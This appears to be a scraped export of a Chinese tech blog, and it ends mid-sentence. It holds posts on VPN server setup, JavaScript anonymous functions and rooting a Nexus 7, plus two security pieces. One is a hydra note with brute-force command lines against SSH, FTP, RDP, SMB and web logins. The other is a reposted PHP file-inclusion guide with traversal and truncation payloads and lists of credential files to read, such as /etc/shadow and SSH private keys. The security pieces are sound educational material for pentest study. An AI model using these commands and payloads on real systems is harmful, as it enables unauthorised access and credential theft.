class=\"number\">32.252</span></span><br><span class=\"line\">require chap = yes</span><br><span class=\"line\">refuse pap = yes</span><br><span class=\"line\">require authentication = yes</span><br><span class=\"line\">name = LinuxVPNserver</span><br><span class=\"line\">ppp debug = yes</span><br><span class=\"line\">pppoptfile = /etc/ppp/options.xl2tpd</span><br><span class=\"line\">length bit = yes</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>修改 /etc/ppp/options.xl2tpd</li>\n</ul>\n<p><code>vi /etc/ppp/options.xl2tpd</code><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipcp-accept-local</span><br><span class=\"line\">ipcp-accept-remote</span><br><span class=\"line\">ms-dns  <span class=\"number\">8.8</span>.<span class=\"number\">8.8</span></span><br><span class=\"line\">ms-dns  <span class=\"number\">8.8</span>.<span class=\"number\">4.4</span></span><br><span class=\"line\"><span class=\"comment\"># ms-dns  192.168.1.1</span></span><br><span class=\"line\"><span class=\"comment\"># ms-dns  192.168.1.3</span></span><br><span class=\"line\"><span class=\"comment\"># ms-wins 192.168.1.2</span></span><br><span class=\"line\"><span class=\"comment\"># ms-wins 192.168.1.4</span></span><br><span class=\"line\">noccp</span><br><span class=\"line\">auth</span><br><span class=\"line\">crtscts</span><br><span class=\"line\">idle <span class=\"number\">1800</span></span><br><span class=\"line\">mtu <span class=\"number\">1410</span></span><br><span class=\"line\">mru <span class=\"number\">1410</span></span><br><span class=\"line\">nodefaultroute</span><br><span class=\"line\">debug</span><br><span class=\"line\">lock</span><br><span class=\"line\">proxyarp</span><br><span class=\"line\">connect-delay <span class=\"number\">5000</span></span><br><span class=\"line\"><span class=\"comment\"># To allow authentication against a Windows domain EXAMPLE, and require the</span></span><br><span class=\"line\"><span class=\"comment\"># user to be in a group \"VPN Users\". Requires the samba-winbind package</span></span><br><span class=\"line\">require-mschap-v2</span><br><span class=\"line\"><span class=\"comment\"># plugin winbind.so</span></span><br><span class=\"line\"><span class=\"comment\"># ntlm_auth-helper '/usr/bin/ntlm_auth --helper-protocol=ntlm-server-1 --require-membership-of=\"EXAMPLE\\\\VPN Users\"'</span></span><br><span class=\"line\"><span class=\"comment\"># You need to join the domain on the server, for example using samba:</span></span><br><span class=\"line\"><span class=\"comment\"># http://rootmanager.com/ubuntu-ipsec-l2tp-windows-domain-auth/setting-up-openswan-xl2tpd-with-native-windows-clients-lucid.html</span></span><br><span class=\"line\">logfile /var/<span class=\"built_in\">log</span>/ppp.log</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>添加用户</li>\n</ul>\n<p><code>vi /etc/ppp/chap-secrets</code> 在文件中按格式添加用户.</p>\n<ul>\n<li>使用的防火墙规则:</li>\n</ul>\n<p>这里直接放出我配置好的防火墙规则,这里真的是卡了好久,对iptables不是非常熟悉.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Generated by iptables-save v1.4.7 on Mon Dec 22 21:49:43 2014</span></span><br><span class=\"line\">*nat</span><br><span class=\"line\">:PREROUTING ACCEPT [<span class=\"number\">834</span>:<span class=\"number\">63397</span>]</span><br><span class=\"line\">:POSTROUTING ACCEPT [<span class=\"number\">0</span>:<span class=\"number\">0</span>]</span><br><span class=\"line\">:OUTPUT ACCEPT [<span class=\"number\">5</span>:<span class=\"number\">365</span>]</span><br><span class=\"line\">-A POSTROUTING <span class=\"operator\">-s</span> <span class=\"number\">192.168</span>.<span class=\"number\">32.0</span>/<span class=\"number\">24</span> -o eth0 -j MASQUERADE</span><br><span class=\"line\">COMMIT</span><br><span class=\"line\"><span class=\"comment\"># Completed on Mon Dec 22 21:49:43 2014</span></span><br><span class=\"line\"><span class=\"comment\"># Generated by iptables-save v1.4.7 on Mon Dec 22 21:49:43 2014</span></span><br><span class=\"line\">*filter</span><br><span class=\"line\">:INPUT ACCEPT [<span class=\"number\">0</span>:<span class=\"number\">0</span>]</span><br><span class=\"line\">:FORWARD ACCEPT [<span class=\"number\">0</span>:<span class=\"number\">0</span>]</span><br><span class=\"line\">:OUTPUT ACCEPT [<span class=\"number\">300</span>:<span class=\"number\">44294</span>]</span><br><span class=\"line\">-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class=\"line\">-A INPUT -p icmp -j ACCEPT</span><br><span class=\"line\">-A INPUT -i lo -j ACCEPT</span><br><span class=\"line\">-A INPUT -p tcp -m state --state NEW -m tcp --dport <span class=\"number\">22</span> -j ACCEPT</span><br><span class=\"line\">-A INPUT -p udp -m state --state NEW -m udp --dport <span class=\"number\">1701</span> -j ACCEPT</span><br><span class=\"line\">-A INPUT -p udp -m state --state NEW -m udp --dport <span class=\"number\">500</span> -j ACCEPT</span><br><span class=\"line\">-A INPUT -p udp -m state --state NEW -m udp --dport <span class=\"number\">4500</span> -j ACCEPT</span><br><span class=\"line\">-A INPUT -j REJECT --reject-with icmp-host-prohibited</span><br><span class=\"line\">-A FORWARD <span class=\"operator\">-d</span> <span class=\"number\">192.168</span>.<span class=\"number\">32.0</span>/<span class=\"number\">24</span> -j ACCEPT</span><br><span class=\"line\">-A FORWARD <span class=\"operator\">-s</span> <span class=\"number\">192.168</span>.<span class=\"number\">32.0</span>/<span class=\"number\">24</span> -j ACCEPT</span><br><span class=\"line\">-A FORWARD -j REJECT --reject-with icmp-host-prohibited</span><br><span class=\"line\">COMMIT</span><br><span class=\"line\"><span class=\"comment\"># Completed on Mon Dec 22 21:49:43 2014</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"最后\">最后</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service xl2tpd restart</span><br><span class=\"line\">service iptables restart</span><br><span class=\"line\">chkconfig xl2tpd on</span><br><span class=\"line\">chkconfig iptables on</span><br><span class=\"line\">chkconfig ipsec on</span><br></pre></td></tr></table></figure>\n<p>参考链接:<a href=\"http://linux.die.net/man/5/xl2tpd.conf\" target=\"_blank\" rel=\"external\">http://linux.die.net/man/5/xl2tpd.conf</a></p>\n"},{"title":"js匿名函数与感叹号","url":"http://ohroot.com/2014/12/08/js匿名函数与感叹号/","content":"<p>关于javascript函数定义……<br><a id=\"more\"></a></p>\n<h2 id=\"函数的定义\">函数的定义</h2><p>首先简单介绍一下函数的定义，大致介绍常见的两种<br>第一种<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">double</span><span class=\"params\">(x)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">2</span> * x;   </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>第二种：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> double = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(x)</span> </span>&#123; <span class=\"keyword\">return</span> <span class=\"number\">2</span>* x; &#125;</span><br></pre></td></tr></table></figure></p>\n<p>注意<code>=</code>右边的函数就是一个匿名函数，创造完毕函数后，又将该函数赋给了变量square。</p>\n<h2 id=\"匿名函数\">匿名函数</h2><p>上面所讲的定义square函数的方式即为匿名函数，这也是最常用的方式之一。<br>还有一种方式，可能也是初学者比较困惑的方式：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(x, y)</span></span>&#123;</span><br><span class=\"line\">    alert(x + y);  </span><br><span class=\"line\">&#125;)(<span class=\"number\">2</span>, <span class=\"number\">3</span>);</span><br></pre></td></tr></table></figure></p>\n<p>这里创建了一个匿名函数(在第一个括号内)，第二个括号用于调用该匿名函数，并传入参数,然后函数顺次执行，并返回<code>undefined</code>。</p>\n<h2 id=\"理论讲完了，讲点重点\"><strong> 理论讲完了，讲点重点 </strong></h2><p>我之前看到别人这些写匿名函数很是困惑，匿名函数既然定义了之后就执行函数体，为什么不直接写代码呢，后来网上查阅了下，别人说的理由如下：</p>\n<ul>\n<li>避免占用全局变量名</li>\n<li>参数保护,函数是独立作用域,传递参数可以保护临时变量,闭包可以保存循环中需要保留的临时变量,还有组件开发时将命名空间传递到函数中用闭包保护起来,即使命名空间被后面的代码重置,原变量被闭包保护将仍然生存</li>\n<li>降低风险,因为没有变量名,中间代码又被闭包保护,js注入无法访问,减少被攻击风险</li>\n</ul>\n<p>好吧，好处显而易见</p>\n<hr>\n<h2 id=\"神奇的感叹号\">神奇的感叹号</h2><p>后来我又看到类似这样的代码<code>!function(){alert(&#39;ohroot&#39;)}()</code>，在函数定义前面加了个<code>!</code>,函数体内代码正常执行，返回值<code>undefined</code>,瞬间又达到了匿名函数的效果。</p>\n<p>我们一般匿名函数长得像这样:<br><code>(function(){alert(&#39;ohroot&#39;)})()// true</code><br>或者：<br><code>(function(){alert(&#39;ohroot&#39;)}())// true</code></p>\n<p>其实无论是括号，还是感叹号，让整个语句合法做的事情只有一件，就是让一个函数声明语句变成了一个表达式。<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;<span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure></p>\n<p>这是一个函数声明，如果在这么一个声明后直接加上括号调用，解析器自然不会理解而报错：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;()<span class=\"comment\">// SyntaxError: unexpected_token</span></span><br></pre></td></tr></table></figure></p>\n<p>因为这样的代码混淆了函数声明和函数调用，以这种方式声明的函数a，就应该以a();的方式调用。</p>\n<p>但是括号则不同，它将一个函数声明转化成了一个表达式，解析器不再以函数声明的方式处理函数a，而是作为一个函数表达式处理，也因此只有在程序执行到函数a时它才能被访问。所以，任何消除函数声明和函数表达式间歧义的方法，都可以被解析器正确识别。比如：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">10</span>&#125;();<span class=\"comment\">// undefined  </span></span><br><span class=\"line\"><span class=\"number\">1</span> &amp;&amp; <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;<span class=\"keyword\">return</span> <span class=\"literal\">true</span>&#125;();<span class=\"comment\">// true  </span></span><br><span class=\"line\"><span class=\"number\">1</span>, <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;();<span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure></p>\n<p>赋值，逻辑，甚至是逗号，各种操作符都可以告诉解析器，这个不是函数声明，它是个函数表达式。并且，对函数一元运算可以算的上是消除歧义最快的方式，感叹号只是其中之一，如果不在乎返回值，这些一元运算都是有效的：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;()<span class=\"comment\">// true</span></span><br><span class=\"line\">+<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;()<span class=\"comment\">// NaN</span></span><br><span class=\"line\">-<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;()<span class=\"comment\">// NaN</span></span><br><span class=\"line\">~<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;()<span class=\"comment\">// -1</span></span><br></pre></td></tr></table></figure></p>\n<p>甚至下面这些关键字，都能很好的工作：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;()<span class=\"comment\">// undefined  </span></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;()<span class=\"comment\">// Object  </span></span><br><span class=\"line\"><span class=\"keyword\">delete</span> <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;()<span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure></p>\n<p>最后，括号做的事情也是一样的，消除歧义才是它真正的工作，而不是把函数作为一个整体，所以无论括号括在声明上还是把整个函数都括在里面，都是合法的：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;)()<span class=\"comment\">// undefined</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;alert(<span class=\"string\">'ohroot'</span>)&#125;())<span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure></p>\n<p>参考文章：<a href=\"http://swordair.com/function-and-exclamation-mark/\" target=\"_blank\" rel=\"external\">function与感叹号</a></p>\n"},{"title":"hydra使用手记","url":"http://ohroot.com/2014/11/24/hydra使用手记/","content":"<p>听说hydra这个工具很好用，自己一直没探索过，以前做Dsploit二次开发的时候就晓得了这个强大的工具，今天试玩一下。<br><a id=\"more\"></a></p>\n<p>简明试玩手记，就不讲述怎么安装云云了</p>\n<h2 id=\"参数说明\">参数说明</h2><figure class=\"highlight haml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]</span><br><span class=\"line\">[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</span><br><span class=\"line\">-<span class=\"ruby\"><span class=\"constant\">R</span> 继续从上一次进度接着破解。</span><br><span class=\"line\"></span>-<span class=\"ruby\"><span class=\"constant\">S</span> 采用<span class=\"constant\">SSL</span>链接。</span><br><span class=\"line\"></span>-<span class=\"ruby\">s <span class=\"constant\">PORT</span> 可通过这个参数指定非默认端口。</span><br><span class=\"line\"></span>-<span class=\"ruby\">l <span class=\"constant\">LOGIN</span> 指定破解的用户，对特定用户破解。</span><br><span class=\"line\"></span>-<span class=\"ruby\"><span class=\"constant\">L</span> <span class=\"constant\">FILE</span> 指定用户名字典。</span><br><span class=\"line\"></span>-<span class=\"ruby\">p <span class=\"constant\">PASS</span> 小写，指定密码破解，少用，一般是采用密码字典。</span><br><span class=\"line\"></span>-<span class=\"ruby\"><span class=\"constant\">P</span> <span class=\"constant\">FILE</span> 大写，指定密码字典。</span><br><span class=\"line\"></span>-<span class=\"ruby\">e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</span><br><span class=\"line\"></span>-<span class=\"ruby\"><span class=\"constant\">C</span> <span class=\"constant\">FILE</span> 使用冒号分割格式，例如“登录名<span class=\"symbol\">:</span>密码”来代替-<span class=\"constant\">L</span>/-<span class=\"constant\">P</span>参数。</span><br><span class=\"line\"></span>-<span class=\"ruby\"><span class=\"constant\">M</span> <span class=\"constant\">FILE</span> 指定目标列表文件一行一条。</span><br><span class=\"line\"></span>-<span class=\"ruby\">o <span class=\"constant\">FILE</span> 指定结果输出文件。</span><br><span class=\"line\"></span>-<span class=\"ruby\">f 在使用-<span class=\"constant\">M</span>参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class=\"line\"></span>-<span class=\"ruby\">t <span class=\"constant\">TASKS</span> 同时运行的线程数，默认为<span class=\"number\">16</span>。</span><br><span class=\"line\"></span>-<span class=\"ruby\">w <span class=\"constant\">TIME</span> 设置最大超时的时间，单位秒，默认是<span class=\"number\">30</span>s。</span><br><span class=\"line\"></span>-<span class=\"ruby\">v / -<span class=\"constant\">V</span> 显示详细过程。</span><br><span class=\"line\"></span>server 目标ip</span><br><span class=\"line\">service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-&#123;head|get&#125; http-&#123;get|post&#125;-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</span><br><span class=\"line\">OPT 可选项</span><br></pre></td></tr></table></figure>\n<h2 id=\"测试实例\">测试实例</h2><ol>\n<li><p>破解ssh：(测试成功)<br><code>hydra ip ssh -l 用户名 -P 密码字典 -t 线程 -o save.log -vV</code></p>\n</li>\n<li><p>破解ftp：(测试成功)<br><code>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV</code></p>\n</li>\n<li><p>get方式提交，破解web登录：(测试成功)<br><code>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</code></p>\n</li>\n<li><p>post方式提交，破解web登录：(测试成功)<br><code>hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot;</code><br>引号里面冒号分隔URL、POST内容、错误回显</p>\n</li>\n<li><p>破解https：<br><code>hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</code></p>\n</li>\n<li><p>破解teamspeak：<br><code>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</code></p>\n</li>\n<li><p>破解cisco：<br><code>hydra -P pass.txt 10.36.16.18 cisco</code><br><code>hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</code></p>\n</li>\n<li><p>破解smb：<br><code>hydra -l administrator -P pass.txt 10.36.16.18 smb</code></p>\n</li>\n<li><p>破解pop3：<br><code>hydra -l muts -P pass.txt my.pop3.mail pop3</code></p>\n</li>\n<li><p>破解rdp：<br><code>hydra ip rdp -l administrator -P pass.txt -V</code></p>\n</li>\n<li><p>破解http-proxy：<br><code>hydra -l admin -P pass.txt http-proxy://10.36.16.18</code></p>\n</li>\n<li><p>破解imap：<br><code>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN</code><br><code>hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</code></p>\n</li>\n</ol>\n<p>参考文章：<a href=\"http://www.ha97.com/5186.html\" target=\"_blank\" rel=\"external\">Linux下的暴力密码在线破解工具Hydra详解</a></p>\n"},{"title":"nexus 7 刷机","url":"http://ohroot.com/2014/11/18/nexus-7-刷机/","content":"<p>本文关于nexus7刷机，更多是记录下资源。<br><a id=\"more\"></a><br>Nexus 7 刷了一个Pwn Pad玩了一下，感觉有些地方不是很好用，所以还是刷回android原生系统。记录下流程</p>\n<h2 id=\"刷官方ROM\">刷官方ROM</h2><ul>\n<li>使用<code>adb reboot bootloader</code>进入fastboot模式。</li>\n<li><code>sudo fastboot oem unlock</code>解锁bootloader。</li>\n<li>下载相应的包链接：<code>https://developers.google.com/android/nexus/images#razor2</code></li>\n<li>解压，执行其中的:<code>flash-all.sh</code></li>\n</ul>\n<h2 id=\"关于root\">关于root</h2><p>主要参考了这篇文章<a href=\"http://itsfoss.com/root-nexus-7-2013-ubuntu-linux/\" target=\"_blank\" rel=\"external\">http://itsfoss.com/root-nexus-7-2013-ubuntu-linux/</a><br>主要命令：<br><code>sudo fastboot flash recovery ~/Path-to-TWRP.img</code><br><code>sudo fastboot boot ~/Path-To-The-Image/CF-Auto-Root-flo-razor-nexus7.img</code></p>\n<p>资源参考链接：<br><a href=\"http://techerrata.com/browse/twrp2/flo\" target=\"_blank\" rel=\"external\">http://techerrata.com/browse/twrp2/flo</a><br><a href=\"http://download.chainfire.eu/347/CF-Root/CF-Auto-Root/CF-Auto-Root-flo-razor-nexus7.zip\" target=\"_blank\" rel=\"external\">http://download.chainfire.eu/347/CF-Root/CF-Auto-Root/CF-Auto-Root-flo-razor-nexus7.zip</a></p>\n"},{"title":"文件包含小总结","url":"http://ohroot.com/2014/11/17/文件包含小总结/","content":"<p>本文转自乌云，原文链接：<a href=\"http://drops.wooyun.org/tips/3827\" target=\"_blank\" rel=\"external\">http://drops.wooyun.org/tips/3827</a><br><a id=\"more\"></a></p>\n<h2 id=\"前言\">前言</h2><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本地文件包含（Local File Inclusion）漏洞了。</p>\n<p>我们来看下面一段index.php代码:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">'func'</span>]) &#123;</span><br><span class=\"line\">   <span class=\"keyword\">include</span> <span class=\"variable\">$_GET</span>[<span class=\"string\">'func'</span>];</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">include</span> <span class=\"string\">'default.php'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>程序的本意可能是当提交url为<code>http://example.com/index.php?func=add.php</code>时，调用add.php里面的样式内容和功能。直接访问<code>http://example.com/index.php</code>则会包含默认的default.php</p>\n<p>那么问题来了，如果我们提交<code>http://example.com/index.php?func=upload/pic/evil.jpg</code>，且evil.jpg是由黑客上传到服务器上的一个图片，在图片的末尾添加了恶意的php代码，那么恶意的代码就会被引入当前文件执行。如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</p>\n<p>在接下来的内容中会以代码样本作为例子，来给大家介绍各种奇葩猥琐的利用姿势。</p>\n<h2 id=\"普通本地文件包含\">普通本地文件包含</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"preprocessor\">&lt;?php</span> <span class=\"keyword\">include</span>(<span class=\"string\">\"inc/\"</span> . <span class=\"variable\">$_GET</span>[<span class=\"string\">'file'</span>]); <span class=\"preprocessor\">?&gt;</span></span></span><br></pre></td></tr></table></figure>\n<p>包含同目录下的文件：<code>?file=.htaccess</code></p>\n<p>目录遍历：</p>\n<p>linux中这两个文件储存着所有文件的路径，需要root权限:<br><code>?file=../../../../../../../../../var/lib/locate.db</code><br><code>?file=../../../../../../../../../var/lib/mlocate/mlocate.db</code></p>\n<p>包含错误日志：<code>?file=../../../../../../../../../var/log/apache/error.log</code>(使payload进入日志,然后包含日志，可getshell)</p>\n<p>获取web目录或者其他配置文件：<code>?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</code>(更多-&gt; <a href=\"http://wiki.apache.org/httpd/DistrosDefaultLayout\" target=\"_blank\" rel=\"external\">http://wiki.apache.org/httpd/DistrosDefaultLayout</a>)</p>\n<p>包含上传的附件：<code>?file=../attachment/media/xxx.file</code></p>\n<p>读取session文件：<code>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</code>(session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell)</p>\n<p>如果拥有root权限还可以试试读这些东西：<br><figure class=\"highlight nimrod\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/root/.ssh/authorized_keys</span><br><span class=\"line\">/root/.ssh/id_rsa</span><br><span class=\"line\">/root/.ssh/id_rsa.keystore</span><br><span class=\"line\">/root/.ssh/id_rsa.pub</span><br><span class=\"line\">/root/.ssh/known_hosts</span><br><span class=\"line\">/etc/shadow</span><br><span class=\"line\">/root/.bash_history</span><br><span class=\"line\">/root/.mysql_history</span><br><span class=\"line\">/<span class=\"keyword\">proc</span>/self/fd/fd[<span class=\"number\">0</span>-<span class=\"number\">9</span>]* (文件标识符)</span><br><span class=\"line\">/<span class=\"keyword\">proc</span>/mounts</span><br><span class=\"line\">/<span class=\"keyword\">proc</span>/config.gz</span><br></pre></td></tr></table></figure></p>\n<p>如果有phpinfo可以包含临时文件： 参见<a href=\"http://hi.baidu.com/mmnwzsdvpkjovwr/item/3f7ceb39965145eea984284el\" target=\"_blank\" rel=\"external\">http://hi.baidu.com/mmnwzsdvpkjovwr/item/3f7ceb39965145eea984284el</a></p>\n<h2 id=\"有限制的本地文件包含\">有限制的本地文件包含</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"preprocessor\">&lt;?php</span> <span class=\"keyword\">include</span>(<span class=\"string\">\"inc/\"</span> . <span class=\"variable\">$_GET</span>[<span class=\"string\">'file'</span>] . <span class=\"string\">\".htm\"</span>); <span class=\"preprocessor\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong> %00截断：</strong><code>?file=../../../../../../../../../etc/passwd%00</code>(需要magic_quotes_gpc=off，PHP小于5.3.4有效)</p>\n<p><strong> %00截断目录遍历：</strong><code>?file=../../../../../../../../../var/www/%00</code>(需要magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>\n<p><strong> 路径长度截断：</strong><code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>\n<p><strong> 